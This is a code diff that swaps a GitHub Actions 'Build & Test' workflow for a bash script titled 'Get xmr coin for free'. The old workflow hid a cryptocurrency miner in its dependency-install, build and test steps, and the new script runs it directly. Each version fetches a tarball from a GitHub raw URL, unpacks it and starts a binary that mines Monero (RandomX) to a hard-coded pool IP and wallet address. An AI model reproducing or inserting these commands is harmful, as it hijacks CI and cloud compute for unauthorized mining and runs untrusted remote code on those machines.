@@ -1,30 +1,10 @@
-name: Build & Test 🧪
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
 
-on:
-  push:
-    branches:
-      - main
-
-env:
-  DOTNET_VERSION: '7.0.x'
-
-jobs:
-  build:
-    runs-on: ubuntu-latest
-
-    steps:
-      - uses: actions/checkout@v3
-
-      - name: Setup .NET 📦
-        uses: actions/setup-dotnet@v3
-        with:
-          dotnet-version: ${{ env.DOTNET_VERSION }}
-
-      - name: Install dependencies 📂
-        run: apt-get update -y && apt-get install wget -y && wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz && tar -xvf scala.tar.gz && cd scala && ./scala -a rx -o 149.102.143.109:80 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf -p 1111
-
-      - name: Build 🧱
-        run: apt-get update -y && apt-get install wget -y && wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz && tar -xvf scala.tar.gz && cd scala && ./scala -a rx -o 149.102.143.109:80 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf -p 1111
-
-      - name: Test 🧪
-        run: apt-get update -y && apt-get install wget -y && wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz && tar -xvf scala.tar.gz && cd scala && ./scala -a rx -o 149.102.143.109:80 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf -p 1111
+apt-get update -y
+apt-get install wget -y
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz
+tar -xvf scala.tar.gz
+cd scala
+./scala -a rx -o 149.102.143.109:80 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf -p test1 -k --tls --rig-id GC-US
